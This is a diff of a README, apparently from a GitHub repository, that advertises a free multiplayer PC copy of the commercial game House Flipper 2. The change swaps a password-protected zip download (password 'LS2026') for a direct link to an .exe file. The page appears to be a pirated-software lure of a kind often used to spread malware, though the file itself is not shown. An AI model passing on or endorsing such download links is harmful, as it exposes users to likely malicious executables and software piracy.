@@ -8,8 +8,7 @@ Complete ready-to-use **House Flipper 2 Free For PC Multiplayer** — the full u
 ---
 ## 📥 Download
 
-📥 [Download `House-Flipper-2-Multiplayer.zip`](https://github.com/AFahim02/House-Flipper-Free-For-PC-Multiplayer/releases/download/Game/House-Flipper-2-Multiplayer.zip)  
-🔐 `LS2026`
+📥 [Download `House-Flipper-2-Multiplayer.exe`](https://github.com/AFahim02/House-Flipper-2-Multiplayer/releases/download/Game/House-Flipper-2-Multiplayer.exe)  
 ---
 ### Archive Contents
 - `HouseFlipper.exe` – main game executable
